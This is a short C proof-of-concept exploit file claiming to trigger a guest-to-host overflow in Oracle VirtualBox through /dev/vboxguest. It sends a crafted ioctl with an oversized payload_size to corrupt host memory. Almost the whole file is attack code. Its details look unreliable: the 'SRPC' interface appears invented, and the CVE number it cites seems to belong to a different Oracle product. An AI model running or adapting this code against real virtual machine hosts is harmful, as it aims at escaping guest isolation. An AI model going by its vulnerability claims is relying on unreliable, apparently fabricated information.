/*
 * PoC for Oracle VM VirtualBox SRPC Guest-to-Host overflow
 * CVE-2016-3427
 * Written in C, interacts with /dev/vboxguest.
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <string.h>

#define VBOXGUEST_IOCTL_MAGIC 0xF5
#define VBOXGUEST_IOCTL_SRPC  _IOWR(VBOXGUEST_IOCTL_MAGIC, 1, struct SRPC)

/* Craft a malicious SRPC request */
struct SRPC {
    uint32_t function_id;
    uint32_t payload_size;
    uint8_t payload[0x100];
};

int main() {
    int fd = open("/dev/vboxguest", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    struct SRPC req;
    req.function_id = 0x100;   // vulnerable SRPC function
    req.payload_size = 0xFFFFFFFF; // integer overflow triggers 0 alloc
    memset(req.payload, 0x41, sizeof(req.payload));

    /* Send the SRPC request to overflow host buffer */
    ioctl(fd, VBOXGUEST_IOCTL_SRPC, &req);
    printf("[+] Ioctl sent, check host memory for corruption\n");
    close(fd);
    return 0;
}